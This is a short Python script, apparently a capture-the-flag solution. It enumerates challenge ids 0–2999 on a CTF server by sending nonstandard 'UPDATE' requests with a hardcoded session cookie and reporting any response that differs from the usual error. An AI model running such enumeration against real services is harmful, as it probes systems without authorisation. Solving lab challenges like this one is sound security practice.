#!/usr/bin/env python3
import requests
url = 'http://challs.dvc.tf:5002/'
#proxies = {'http':'http://127.0.0.1:8080'}
def find_next_challenge(id):
  errors=['Challenge not found']
  try:
    r=requests.request('UPDATE',url,json={'number':'1','id':str(id)} ,cookies={'session':'eyJ1c2VybmFtZSI6InJ5bjAifQ.Yi3WgQ.LMm_jqlgTHGpJ8s9J3ntantKW30'})
    if r.status_code == 400:
      res = r.json()['error']
      if res not in errors:
        print(f'diff error at : {id}')
    else:
      print(f'Something diff at : {id}')
  except Exception as e:
    print(e)

if __name__ == '__main__':
  for i in range(0,3000):
    find_next_challenge(i)

